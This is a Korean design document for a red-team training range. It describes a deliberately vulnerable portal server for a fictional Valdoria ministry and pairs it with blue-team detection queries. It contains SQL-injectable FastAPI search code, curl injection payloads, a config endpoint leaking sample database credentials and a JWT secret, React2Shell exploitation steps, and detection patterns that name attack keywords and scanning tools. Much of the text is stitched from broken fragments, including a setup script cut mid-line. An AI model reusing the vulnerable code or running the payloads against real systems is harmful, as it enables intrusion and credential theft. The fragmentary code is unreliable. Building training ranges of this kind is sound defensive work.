## 1. 개요

### 1.1 자산 목적

외부 포털 서버는 가상 국가 Valdoria의 행정안전부(MOIS) 대표 홈페이지를 호스팅하는 웹 서버이다. 일반 국민이 접근할 수 있는 공개 서비스로, 다음 기능을 제공한다:

- **공지사항 게시판**: 정책 공지, 보도자료 등 열람
- **통합 검색**: 사이트 내 콘텐츠 검색
- **민원 조회**: 민원 접수번호 기반 처리 상태 확인

### 1.2 훈련에서의 역할

이 자산은 레드팀의 **최초 진입점(Initial Access)**으로 설계되었다. 공격자는 외부에서 접근 가능한 이 서버를 대상으로 정찰(Reconnaissance)을 수행하고, 의도적으로 설계된 취약점을 활용하여 내부 네트워크로의 피벗(Pivot) 기반을 마련한다.

### 1.3 공격 체인에서의 위치

```
[인터넷]
    |
    v
[OPNSense-1 외부 방화벽]
    |
    v
[★ 외부 포털 서버 (192.168.92.201)] ← STEP 1-1: 정찰 및 초기 진입
    |
    | (Cross-zone DB 연결)
    v
[OPNSense-2 내부 방화벽]
    |
    v
[DB 서버 (192.168.92.208)] ← STEP 1-2 이후: 내부 피벗
```

레드팀은 이 서버에서 발견한 API 구조 노출, 인증 미적용 관리자 엔드포인트, SQL Injection 취약점을 순차적으로 활용하여 DB 서버의 크리덴셜을 확보한다. 또한 Next.js의 React2Shell 취약점(CVE-2025-55182)을 통해 서버 RCE를 획득하여 내부 네트워크로의 피벗 기반을 마련한다.

### 요청 처리 흐름

1. 클라이언트 요청 → Nginx (443/80)
2. 정적 파일 요청 (`/`, `/static/*`) → Nginx가 직접 서빙
3. API 요청 (`/api/*`, `/docs`, `/openapi.json`) → Nginx가 `localhost:8000`으로 프록시
4. FastAPI가 요청 처리, 필요시 PostgreSQL(192.168.92.208) 쿼리
5. 응답 반환

## 4. 네트워크 설정

### 4.1 인터페이스 구성

| 인터페이스 | IP 주소 | 서브넷 | 용도 |
|-----------|---------|--------|------|

- 기본 게이트웨이: 192.168.92.1
- DNS: 192.168.92.1 (테스트 환경 게이트웨이 또는 외부 DNS)

### 4.2 리스닝 포트

| 포트 | 프로토콜 | 서비스 | 바인드 주소 | 비고 |
|------|---------|--------|------------|------|
| 80 | TCP/HTTP | Nginx | 0.0.0.0 | HTTPS 리다이렉트 |
| 443 | TCP/HTTPS | Nginx | 0.0.0.0 | TLS 종단, 메인 서비스 |
| 8000 | TCP/HTTP | Uvicorn | 127.0.0.1 | FastAPI (로컬 전용) |
| 22 | TCP/SSH | OpenSSH | 0.0.0.0 | 관리용 (DMZ 내부에서만 접근 가능) |

### 4.3 방화벽 규칙 (OPNSense-1 기준)

| 순번 | 출발지 | 목적지 | 포트 | 프로토콜 | 동작 | 비고 |
|------|--------|--------|------|---------|------|------|
| 1 | ANY (인터넷) | 192.168.92.201 | 80 | TCP | ALLOW | HTTP 접근 |
| 2 | ANY (인터넷) | 192.168.92.201 | 443 | TCP | ALLOW | HTTPS 접근 |
| 3 | ANY (인터넷) | 192.168.92.201 | 8000 | TCP | ALLOW | FastAPI 직접 접근 (의도적 취약 설정) |
| 4 | ANY (인터넷) | 192.168.92.201 | 22 | TCP | DROP | SSH 외부 차단 |

> **취약점 설계 포인트**: 포트 8000이 외부에서 직접 접근 가능하도록 의도적으로 방화벽을 열어둔다. 이를 통해 공격자가 Nginx를 우회하고 FastAPI의 `/docs`, `/openapi.json`에 직접 접근할 수 있다.

## 6. API/서비스 명세

### 6.1 정상 엔드포인트

#### GET /api/notices

공지사항 목록 조회.

| 항목 | 내용 |
|------|------|
| 인증 | 불필요 |
| 쿼리 파라미터 | `page` (int, default=1), `size` (int, default=20), `category` (str, optional) |

**응답 (200 OK):**
```json
{
  "total": 142,
  "page": 1,
  "size": 20,
  "items": [
    {
      "id": 1,
      "title": "2026년 상반기 정책 브리핑 일정 안내",
      "category": "정책",
      "created_at": "2026-03-20T09:00:00",
      "view_count": 1523
    }
  ]
}
```

#### GET /api/notices/{id}

공지사항 상세 조회.

**응답 (200 OK):**
```json
{
  "id": 1,
  "title": "2026년 상반기 정책 브리핑 일정 안내",
  "category": "정책",
  "content": "본문 내용...",
  "author": "홍보담당관",
  "created_at": "2026-03-20T09:00:00",
  "attachments": []
}
```

#### GET /api/search

통합 검색 (**취약점 포함** - 아래 6.2 참조).

| 항목 | 내용 |
|------|------|
| 인증 | 불필요 |
| 쿼리 파라미터 | `q` (str, required), `type` (str, optional: "notice"/"inquiry"), `page` (int), `size` (int) |

**응답 (200 OK):**
```json
{
  "total": 5,
  "query": "정책",
  "items": [
    {
      "id": 1,
      "type": "notice",
      "title": "2026년 상반기 정책 브리핑 일정 안내",
      "snippet": "...정책 브리핑 일정을 다음과 같이 안내...",
      "url": "/notices/1"
    }
  ]
}
```

#### GET /api/inquiry/{tracking_number}

민원 처리 상태 조회.

| 항목 | 내용 |
|------|------|
| 인증 | 불필요 |
| 경로 파라미터 | `tracking_number` (str, 형식: INQ-YYYYMMDD-XXXX) |

**응답 (200 OK):**
```json
{
  "tracking_number": "INQ-20260315-0042",
  "subject": "도로 보수 요청",
  "status": "처리중",
  "submitted_at": "2026-03-15T14:30:00",
  "department": "도로관리과"
}
```

내부 설정 정보 노출. **데이터베이스 접속 정보가 포함된다.**

**응답 (200 OK):**
```json
{
  "app_name": "MOIS Portal",
  "version": "1.2.0",
  "environment": "production",
  "database": {
    "host": "192.168.92.208",
    "port": 5432,
    "name": "mois_portal",
    "user": "portal_app",
    "password": "P0rtal#DB@2026!"
  },
  "jwt_secret": "valdoria-mois-jwt-secret-key-2026",
  "debug_mode": false,
  "allowed_origins": ["https://www.mois.valdoria.gov"]
}
```

> **핵심 취약점**: 이 엔드포인트를 통해 공격자가 DB 크리덴셜을 획득하여 내부 네트워크의 PostgreSQL 서버에 직접 접근할 수 있는 경로가 열린다.

#### GET /api/internal/health

### 취약점 #3: SQL Injection (검색 기능)

| 항목 | 내용 |
|------|------|
| 취약점 유형 | SQL Injection (Union-based, Error-based) |
| MITRE ATT&CK | T1190 (Exploit Public-Facing Application) |
| 심각도 | Critical |
| 위치 | `/api/search?q=` |

**구현 방법:**

검색 기능에서 사용자 입력을 파라미터 바인딩 없이 직접 SQL 문자열에 삽입한다.

```python
# routers/search.py - 취약한 구현
from fastapi import APIRouter, Query, Depends
from database import get_db
import logging

logger = logging.getLogger("mois-portal")
router = APIRouter(prefix="/api", tags=["search"])

@router.get("/search")
async def search(
    q: str = Query(..., description="검색어"),
    type: str = Query(None, description="검색 유형"),
    page: int = Query(1, ge=1),
    size: int = Query(20, ge=1, le=100),
    db=Depends(get_db)
):
    offset = (page - 1) * size

    # ★ 취약점: 사용자 입력(q)을 직접 SQL 문자열에 삽입
    # 올바른 구현: await db.fetch_all(
    #     "SELECT ... WHERE title ILIKE $1", [f"%{q}%"]
    # )
    base_query = f"""
        SELECT id, 'notice' as type, title,
               SUBSTRING(content, 1, 200) as snippet
        FROM notices
        WHERE title ILIKE '%{q}%' OR content ILIKE '%{q}%'
    """

    if type == "inquiry":
        base_query = f"""
            SELECT id, 'inquiry' as type, subject as title,
                   SUBSTRING(description, 1, 200) as snippet
            FROM inquiries
            WHERE subject ILIKE '%{q}%' OR tracking_number ILIKE '%{q}%'
        """

    count_query = f"SELECT COUNT(*) FROM ({base_query}) as sub"
    data_query = f"{base_query} ORDER BY id DESC LIMIT {size} OFFSET {offset}"

    try:
        total = await db.fetch_val(count_query)
        items = await db.fetch_all(data_query)
        logger.info(f"Search query executed: q={q}, results={total}")
        return {
            "total": total,
            "query": q,
            "items": [dict(r) for r in items]
        }
    except Exception as e:
        # ★ 취약점: 에러 메시지에 SQL 오류 상세 정보 노출
        logger.error(f"Search error: {str(e)}, query={q}")
        return {"error": f"검색 중 오류가 발생했습니다: {str(e)}"}
```

**SQLi 공격 예시:**

```bash

# 2. Union-based: 테이블 목록 추출
curl "https://www.mois.valdoria.gov/api/search?q=' UNION SELECT 1,2,table_name,4 FROM information_schema.tables WHERE table_schema='public'--"

# 3. 사용자 크리덴셜 추출

# 4. DB 연결 정보 확인
curl "https://www.mois.valdoria.gov/api/search?q=' UNION SELECT 1,2,current_user,inet_server_addr()::text--"
```

**레드팀 활용 시나리오:**

1. 검색 기능에서 `'` 입력 시 SQL 에러 메시지 확인

### 취약점 #5: React2Shell — RSC Deserialization RCE (CVE-2025-55182)

| 항목 | 내용 |
|------|------|
| 취약점 유형 | Unsafe Deserialization / Remote Code Execution |
| CVE | CVE-2025-55182 |
| MITRE ATT&CK | T1190 (Exploit Public-Facing Application) |
| CVSS | 10.0 (Critical) |
| 심각도 | Critical |
| 영향 버전 | React 19.0.0~19.2.0, Next.js 15.0.0~16.0.6 (App Router) |
| 패치 버전 | React 19.0.1, 19.1.2, 19.2.1 / Next.js 15.0.4+ |
| 위치 | Next.js RSC Flight 프로토콜 (모든 POST 요청) |

**배경:**

React2Shell은 2025년 12월 3일에 공개된 React Server Components(RSC)의 Flight 프로토콜 역직렬화 취약점이다. 공격자가 조작된 RSC 페이로드를 POST 요청으로 전송하면, 서버가 이를 역직렬화하는 과정에서 인증/라우팅/검증 로직 이전 단계에서 임의 코드가 실행된다. 공개 직후 수 시간 만에 국가 배후 APT 그룹들이 실전 공격에 활용하기 시작했다.

**구현 방법:**

의도적으로 취약한 버전의 Next.js(15.0.3)와 React(19.1.0)을 사용한다. App Router 기반이면 기본 설정 그대로 취약하다.

```json
// package.json — 취약 버전 고정
{
  "dependencies": {
    "next": "15.0.3",
    "react": "19.1.0",
    "react-dom": "19.1.0"
  }
}
```

```javascript
// app/layout.js — 표준 App Router 레이아웃 (기본 설정으로 취약)
export default function RootLayout({ children }) {
  return (
    <html lang="en">
      <body>{children}</body>
    </html>
  );
}
```

Next.js App Router를 사용하는 것만으로 RSC Flight 프로토콜이 활성화되며, 별도 설정 없이 기본 상태에서 취약하다. 올바른 구현은 Next.js 15.0.4 이상으로 업그레이드하는 것이다.

**레드팀 활용 시나리오:**

```bash
# 1. Next.js 버전 확인 (응답 헤더 또는 /_next/ 경로 확인)
curl -sI https://www.mois.valdoria.gov/ | grep -i "x-powered-by\|server"

# 2. RSC Flight 프로토콜 탐지 (Next.js App Router 특유의 RSC 응답)
curl -s "https://www.mois.valdoria.gov/?_rsc=1" -H "RSC: 1" | head -5

# 3. React2Shell 익스플로잇 — 조작된 RSC 페이로드로 RCE
#    (역직렬화 과정에서 서버-사이드 JavaScript 실행)
curl -X POST "https://www.mois.valdoria.gov/" \
  -H "Content-Type: text/x-component" \
  -H "Next-Action: <action_id>" \
  -d '<crafted_rsc_payload>'

# 4. 포스트-익스플로잇: 환경변수 탈취 (DB 크리덴셜 등)
#    셸 획득 후 process.env에서 DB_HOST, DB_PASSWORD 등 추출
#    또는 .env 파일 직접 읽기
```

**취약점 #2와의 시너지:**

React2Shell로 서버 셸을 획득하면, 파일시스템의 `.env` 파일이나 `process.env`에서 DB 크리덴셜을 직접 추출할 수 있다. 이는 취약점 #2(인증 미적용 `/api/internal/config`)와 동일한 정보를 제공하지만, React2Shell은 추가로:
- 서버에서 임의 명령 실행 가능 (역방향 셸, 파일 다운로드 등)
- Node.js 런타임 권한으로 내부 네트워크 스캐닝 가능
- 다른 내부 서비스(FastAPI 백엔드)로의 SSRF 또는 직접 접근 가능

이를 통해 공격자는 API 취약점을 통한 데이터 탈취(취약점 #2, #3)와 별도로, 서버 자체의 완전한 제어권을 확보하여 C2 에이전트 설치, 내부 피벗 등 다양한 후속 공격이 가능하다.

**블루팀 탐지 포인트:**

| 탐지 항목 | 방법 |

| RSC 페이로드 POST | Nginx 로그에서 `Content-Type: text/x-component` 또는 `Next-Action` 헤더 포함 POST 요청 |

| PostgreSQL 쿼리 로그 | 원격 DB 서버 측 | postgresql.log | 비정상 쿼리, UNION SELECT |
| systemd 저널 | `journalctl -u mois-portal` | journal | 서비스 시작/중지, 크래시 |

### 9.3 탐지 시나리오별 IoC 및 탐지 쿼리

#### 탐지 #1: API 스캐닝 / 엔드포인트 퍼징

**IoC:**
- 단일 IP에서 짧은 시간 내 다수의 404/405 응답
- `/api/admin`, `/api/internal`, `/docs`, `/openapi.json` 등 민감 경로 접근
- 일반적이지 않은 User-Agent (gobuster, ffuf, dirb, nikto 등)

**Nginx 로그 기반 탐지 쿼리 (예: Splunk SPL):**
```spl
source="/var/log/nginx/mois-portal-access.log"
| rex field=_raw "^(?<src_ip>\S+).*\"(?<method>\S+)\s+(?<uri>\S+)"
| where status=404 OR status=405
| stats count as error_count dc(uri) as unique_paths by src_ip
| where error_count > 50 AND unique_paths > 20
| sort -error_count
```

**Sigma 룰 (간략):**
```yaml
title: API Endpoint Fuzzing Detection
logsource:
  product: nginx
  service: access
detection:
  selection:
    status:
      - 404
      - 405
  timeframe: 5m
  condition: selection | count(uri) by src_ip > 50
level: medium
```

#### 탐지 #2: 인증 미적용 관리자 API 접근

**IoC:**
- 외부 IP에서 `/api/admin/*` 또는 `/api/internal/*` 접근
- 응답 코드 200 (인증 없이 성공)
- `/api/internal/config` 접근 (크리덴셜 노출 시도)

**탐지 쿼리 (Splunk SPL):**
```spl
source="/var/log/nginx/mois-portal-access.log"
| rex field=_raw "^(?<src_ip>\S+).*\"(?<method>\S+)\s+(?<uri>\S+)\s+HTTP/\S+\"\s+(?<status>\d+)"
| where (match(uri, "/api/admin/") OR match(uri, "/api/internal/")) AND status=200
| table _time src_ip method uri status
| sort _time
```

**FastAPI 앱 로그 탐지:**
```spl
source="/var/log/mois-portal/app.log"
| spath
| where endpoint IN ("/api/admin/users", "/api/internal/config", "/api/internal/health")
| stats count by src_ip endpoint
```

#### 탐지 #3: SQL Injection 시도

**IoC:**
- 검색 파라미터에 SQL 키워드 포함: `UNION`, `SELECT`, `INSERT`, `DROP`, `--`, `'`, `OR 1=1`
- FastAPI 로그에 SQL 에러 메시지 출력
- PostgreSQL 로그에 비정상 쿼리 기록
- 응답에 DB 에러 메시지 포함

**Nginx 로그 기반 탐지 (URL 디코딩 후):**
```spl
source="/var/log/nginx/mois-portal-access.log"
| rex field=_raw "\"GET\s+/api/search\?q=(?<search_param>[^\"]+)"
| eval search_decoded=urldecode(search_param)
| where match(search_decoded, "(?i)(union\s+select|or\s+1\s*=\s*1|'\s*(or|and)|--\s*$|information_schema|pg_catalog|drop\s+table)")
| table _time src_ip search_decoded status
```

**FastAPI 앱 로그 탐지:**
```spl
source="/var/log/mois-portal/app.log"
| spath
| where log_level="ERROR" AND match(message, "(?i)(syntax error|unterminated|invalid input)")
| table _time src_ip message query_param
```

**PostgreSQL 쿼리 로그 탐지 (DB 서버 측):**
```spl
source="/var/log/postgresql/postgresql-15-main.log"
| where match(_raw, "(?i)(UNION\s+SELECT|information_schema|pg_sleep)")
| rex field=_raw "(?<query>SELECT.*)"
| table _time query
```

#### 탐지 #4: Swagger UI / OpenAPI 스펙 접근

**IoC:**
- `/docs`, `/redoc`, `/openapi.json` 접근
- 특히 외부 IP에서의 접근

**탐지 쿼리:**
```spl
source="/var/log/nginx/mois-portal-access.log"
| rex field=_raw "^(?<src_ip>\S+).*\"(?<method>\S+)\s+(?<uri>\S+)"
| where uri IN ("/docs", "/redoc", "/openapi.json", "/docs/", "/redoc/")
| table _time src_ip uri status
```

### 9.4 알림 우선순위

| 우선순위 | 탐지 항목 | 조건 | 대응 |
|---------|----------|------|------|
| **Critical** | SQL Injection 성공 | 검색 파라미터에 SQL 키워드 + 200 응답 | 즉시 IP 차단, 포렌식 |
| **High** | 관리자 API 무단 접근 | `/api/admin/*` 또는 `/api/internal/config` 200 응답 | IP 차단, 크리덴셜 교체 검토 |
| **Medium** | API 스캐닝 | 5분 내 50회 이상 404/405 | 모니터링 강화, 필요시 차단 |
| **Low** | Swagger UI 접근 | `/docs`, `/openapi.json` 접근 | 로깅, 모니터링 |

```bash
#!/bin/bash

# 사용법: sudo bash setup.sh
# 사전 요건: Ubuntu 22.04 LTS, 인터넷 접근 가능, .env 파일 준비

set -euo pipefail

# ===== [1] 변수 설정 =====

if [ ! -f "${SCRIPT_DIR}/.env" ]; then
    echo "[ERROR] .env 파일이 없습니다. .env.example을 참고하여 생성하세요."
    exit 1
fi

# ===== [3] 시스템 업데이트 및 기본 패키지 설치 =====
apt-get update && apt-get upgrade -y

    nginx \
    python3.11 python3.11-venv python3-pip \
    postgresql-client-15 \
    curl gnupg

# Node.js 20 LTS 설치 (NodeSource)
curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
apt-get install -y nodejs

# ===== [4] 사용자 생성 =====
id -u ${APP_USER} &>/dev/null || useradd -m -s /bin/bash ${APP_USER}

# ===== [5] 애플리케이션 배포 =====
mkdir -p ${APP_DIR}
cp -r ${SCRIPT_DIR}/src/backend ${APP_DIR}/backend
cp -r ${SCRIPT_DIR}/src/frontend ${APP_DIR}/frontend
cp ${SCRIPT_DIR}/.env ${APP_DIR}/.env

# ===== [6] Python 가상환경 및 패키지 =====

${APP_DIR}/venv/bin/pip install --upgrade pip
${APP_DIR}/venv/bin/pip install -r ${APP_DIR}/backend/requirements.txt

    cp ${SCRIPT_DIR}/certs/server.key /etc/nginx/ssl/mois-portal.key
else

        -keyout /etc/nginx/ssl/mois-portal.key \

        -subj "/C=VD/ST=Valdoria/L=Capital/O=MOIS/CN=www.mois.valdoria.gov"

User-agent: *
```

```jsx
// src/pages/NoticeList.jsx
import { useState, useEffect } from 'react';
import { useSearchParams, Link } from 'react-router-dom';
import api from '../utils/api';
import Breadcrumb from '../components/Breadcrumb';
import Pagination from '../components/Pagination';

export default function NoticeList() {
  const [searchParams, setSearchParams] = useSearchParams();
  const [notices, setNotices] = useState([]);
  const [total, setTotal] = useState(0);
  const [loading, setLoading] = useState(true);

  const page = parseInt(searchParams.get('page') || '1');
  const category = searchParams.get('category') || '';
  const size = 10;

  useEffect(() => {
    setLoading(true);
    console.log(`[DEBUG] NoticeList: fetching page=${page}, category=${category}`);
    const params = { page, size };
    if (category) params.category = category;

    api.get('/api/notices', { params })
      .then(res => {
        setNotices(res.data.items);
        setTotal(res.data.total);
      })
      .catch(err => console.error('[DEBUG] NoticeList API Error:', err))
      .finally(() => setLoading(false));
  }, [page, category]);

  const categories = ['전체', '정책', '보도', '채용', '교육', '일반'];

  const handleCategoryChange = (cat) => {
    setSearchParams(cat === '전체' ? { page: '1' } : { page: '1', category: cat });
  };

  return (
    <div className="max-w-6xl mx-auto px-4 py-6">
      <Breadcrumb items={[{ label: '홈', to: '/' }, { label: '공지사항' }]} />

      {/* 카테고리 필터 + 검색 */}
      {/* 테이블 */}
      {/* 페이지네이션 */}
      <Pagination current={page} total={Math.ceil(total / size)}
        onChange={(p) => setSearchParams({ ...Object.fromEntries(searchParams), page: String(p) })} />
    </div>
  );
}
```

```jsx
import { useState, useEffect } from 'react';
```

```jsx
import Pagination from '../components/Pagination';

export default function Search() {
  const [searchParams, setSearchParams] = useSearchParams();
  const [results, setResults] = useState([]);
  const [total, setTotal] = useState(0);
  const [loading, setLoading] = useState(false);
  const [inputValue, setInputValue] = useState('');

    e.preventDefault();
    if (inputValue.trim()) {

    }
  };

    if (!query) return text;

      </h1>
      <form onSubmit={handleSearch} className="flex gap-2 mb-6">
        <input type="text" value={inputValue} onChange={e => setInputValue(e.target.value)}
          className="flex-1 border-2 border-gray-300 rounded px-4 py-3 text-lg
                     focus:border-[#1a5276] focus:outline-none"
          placeholder="검색어를 입력하세요" />
        <button type="submit"
          className="px-8 py-3 bg-[#1a5276] text-white rounded text-lg hover:bg-[#154360]">
          검색
        </button>
      </form>
      {query && (
        <p className="mb-4 text-gray-600">
          검색 결과 총 <strong>{total}</strong>건 (검색어: "{query}")
        </p>
      )}
      {/* SearchResultItem 목록 및 Pagination 렌더링 */}
    </div>
```

```
[처음] [이전]  1  [2]  3  4  5  [다음] [끝]
                   ^-- 현재 페이지 (강조 표시)
```

```jsx
// src/components/Pagination.jsx
export default function Pagination({ current, total, onChange }) {
  if (total <= 1) return null;

  const getPageNumbers = () => {
    const pages = [];
    const start = Math.max(1, current - 2);
    const end = Math.min(total, current + 2);
    for (let i = start; i <= end; i++) pages.push(i);
    return pages;
  };

  return (
    <div className="flex justify-center items-center gap-1 mt-8">
      <button onClick={() => onChange(1)} disabled={current === 1}
        className="px-3 py-1.5 border rounded text-sm hover:bg-gray-100
                   disabled:opacity-30 disabled:cursor-not-allowed">
        처음
      </button>
      <button onClick={() => onChange(current - 1)} disabled={current === 1}
        className="px-3 py-1.5 border rounded text-sm hover:bg-gray-100
                   disabled:opacity-30 disabled:cursor-not-allowed">
        이전
      </button>
      {getPageNumbers().map(p => (
        <button key={p} onClick={() => onChange(p)}
          className={`px-3 py-1.5 border rounded text-sm
            ${p === current
              ? 'bg-[#1a5276] text-white border-[#1a5276]'
              : 'hover:bg-gray-100'}`}>
          {p}
        </button>
      ))}
      <button onClick={() => onChange(current + 1)} disabled={current === total}
        className="px-3 py-1.5 border rounded text-sm hover:bg-gray-100
                   disabled:opacity-30 disabled:cursor-not-allowed">
        다음
      </button>
      <button onClick={() => onChange(total)} disabled={current === total}
        className="px-3 py-1.5 border rounded text-sm hover:bg-gray-100
                   disabled:opacity-30 disabled:cursor-not-allowed">
        끝
      </button>
    </div>
  );
}
```

### 11.5 상태 관리 및 API 연동

#### 11.5.1 API 인스턴스 설정

> **취약점:** API base URL이 JavaScript 번들에 하드코딩되어 있어, 공격자가 빌드된 JS 파일을 분석하면 모든 API 엔드포인트 구조를 파악할 수 있다.

```javascript
// src/utils/api.js
import axios from 'axios';

// [취약점] API base URL이 소스 코드에 하드코딩됨
// 공격자가 빌드된 JS 번들을 분석하면 API 서버 주소와 엔드포인트를 확인할 수 있음
const API_BASE_URL = 'https://www.mois.valdoria.gov';

// [취약점] 프로덕션 빌드에서도 디버그 로그가 남아있음
console.log('[DEBUG] API Base URL:', API_BASE_URL);
console.log('[DEBUG] API module loaded at:', new Date().toISOString());

const api = axios.create({
  baseURL: API_BASE_URL,
  timeout: 10000,
  headers: {
    'Content-Type': 'application/json',
  },
  // [취약점] CSRF 토큰 미적용 - withCredentials도 미설정
});

// 요청 인터셉터
api.interceptors.request.use(
  (config) => {
    // [취약점] 요청 정보를 콘솔에 출력
    console.log(`[DEBUG] API Request: ${config.method?.toUpperCase()} ${config.url}`, config.params);
    return config;
  },
  (error) => {
    console.error('[DEBUG] API Request Error:', error);
    return Promise.reject(error);
  }
);

// 응답 인터셉터
api.interceptors.response.use(
  (response) => {
    // [취약점] 응답 데이터를 콘솔에 출력
    console.log(`[DEBUG] API Response: ${response.status}`, response.data);
    return response;
  },
  (error) => {
    console.error('[DEBUG] API Response Error:', {
      status: error.response?.status,
      data: error.response?.data,
      url: error.config?.url,
    });
    return Promise.reject(error);
  }
);

export default api;
```

#### 11.5.2 상태 관리 패턴

별도의 전역 상태 관리 라이브러리(Redux, Zustand 등)는 사용하지 않는다. 각 페이지 컴포넌트가 `useState`와 `useEffect`로 자체 상태를 관리하는 단순한 구조를 채택한다. 이는 훈련용 포털의 복잡도를 낮추고 빠른 구축을 위한 선택이다.

**공통 상태 패턴:**

```jsx
// 모든 데이터 패칭 페이지에서 사용하는 공통 패턴
const [data, setData] = useState(null);       // API 응답 데이터
const [loading, setLoading] = useState(true); // 로딩 상태
const [error, setError] = useState(null);     // 에러 메시지

useEffect(() => {
  setLoading(true);
  api.get('/api/endpoint')
    .then(res => setData(res.data))
    .catch(err => setError('데이터를 불러올 수 없습니다.'))
    .finally(() => setLoading(false));
}, [dependency]);
```


### 11.8 보안 관련 의도적 취약점 (프론트엔드)

프론트엔드에 의도적으로 포함된 보안 취약점 목록이다. 이 취약점들은 레드팀이 정찰 단계에서 활용할 수 있도록 설계되었다.

#### 취약점 F-1: API Base URL 하드코딩

| 항목 | 내용 |
|------|------|
| 유형 | Information Disclosure |
| 위치 | `src/utils/api.js` → 빌드 후 `/assets/index-[hash].js` |
| 심각도 | Low-Medium |

**설명:**

API base URL이 `src/utils/api.js`에 문자열 리터럴로 하드코딩되어 있다. Vite 빌드 후에도 번들된 JavaScript 파일 내에 해당 문자열이 그대로 포함된다. 공격자가 브라우저 개발자 도구의 Sources 탭이나 빌드된 JS 파일을 직접 다운로드하여 분석하면 API 서버 주소와 사용 중인 엔드포인트 경로를 파악할 수 있다.

**공격자 활용 시나리오:**

```
1. 브라우저에서 www.mois.valdoria.gov 접속
2. F12 → Sources 탭 → assets/index-[hash].js 열기
3. "api" 또는 "/api/" 문자열 검색
4. API_BASE_URL 및 각 페이지에서 호출하는 엔드포인트 경로 확인
   - /api/notices, /api/search, /api/inquiry 등 정상 엔드포인트
   - /api/admin/*, /api/internal/* 등 관리자/내부 엔드포인트 (라우터 코드에서 확인 가능)
5. 이를 통해 Swagger UI(/docs) 접근 없이도 API 구조 파악 가능
```

#### 취약점 F-2: CSRF 토큰 미적용

| 항목 | 내용 |
|------|------|
| 유형 | Cross-Site Request Forgery (CSRF) |
| 위치 | `src/utils/api.js` (Axios 인스턴스 설정) |
| 심각도 | Medium |

**설명:**

Axios 인스턴스에 CSRF 토큰 관련 설정이 없다. `withCredentials`도 설정되지 않았고, 요청 헤더에 CSRF 토큰을 포함하는 로직이 존재하지 않는다. 백엔드(FastAPI)에서도 CSRF 검증을 수행하지 않으므로, 외부 사이트에서 사용자의 브라우저를 통해 API 요청을 유도하는 CSRF 공격이 가능하다.

특히 `/api/admin/notices` POST 엔드포인트는 인증도 없고 CSRF 방어도 없으므로, 공격자가 악성 웹페이지를 통해 공지사항을 임의 작성할 수 있다.

#### 취약점 F-3: 관리자 로그인 페이지 은닉 (Security through Obscurity)

| 항목 | 내용 |
|------|------|
| 유형 | Security Misconfiguration |
| 위치 | `src/App.jsx` (라우터 설정), `/login` 경로 |
| 심각도 | Low |

**설명:**

관리자 로그인 페이지(`/login`)가 존재하지만 Header 컴포넌트의 내비게이션 메뉴에는 해당 링크가 포함되지 않는다. 일반 사용자 관점에서는 로그인 기능이 없는 것처럼 보이지만, JavaScript 소스를 분석하면 `/login` 라우트가 등록되어 있음을 확인할 수 있다.

**공격자 활용 시나리오:**

```
1. 빌드된 JS 번들에서 "login" 또는 "admin" 문자열 검색
2. React Router의 라우트 설정에서 /login 경로 발견
3. www.mois.valdoria.gov/login 직접 접근
4. 관리자 기능의 존재를 확인 → /api/admin/* 엔드포인트 탐색으로 이어짐
```

#### 취약점 F-4: 프로덕션 빌드 내 디버그 로그

| 항목 | 내용 |
|------|------|
| 유형 | Information Disclosure |
| 위치 | 전체 프론트엔드 소스 (각 페이지 컴포넌트, `api.js`) |
| 심각도 | Low |

**설명:**

모든 페이지 컴포넌트와 API 유틸리티에 `console.log` 및 `console.error` 문이 `[DEBUG]` 접두사와 함께 포함되어 있다. 프로덕션 빌드 시 이 로그 문을 제거하는 설정(예: Vite의 `esbuild.drop`)이 적용되지 않았으므로, 브라우저 콘솔에서 다음 정보가 노출된다:

- API base URL
- 모든 API 요청의 메서드, URL, 파라미터
- 모든 API 응답의 상태 코드와 데이터
- 각 페이지의 로드 시점 및 상태 변화

**공격자 활용 시나리오:**

```
1. www.mois.valdoria.gov 접속 후 F12 → Console 탭 확인
2. "[DEBUG] API Base URL: https://www.mois.valdoria.gov" 확인
3. 페이지를 탐색하면서 콘솔에 출력되는 모든 API 요청/응답 모니터링
4. API 응답 구조와 데이터 형식을 직접 확인
5. 에러 발생 시 상세 에러 정보(스택 트레이스 등) 확인 가능
```

**Vite 빌드 설정 (의도적으로 미적용):**

```javascript

//   esbuild: {
//     drop: ['console', 'debugger'],  // 프로덕션에서 console.* 제거
//   }
```
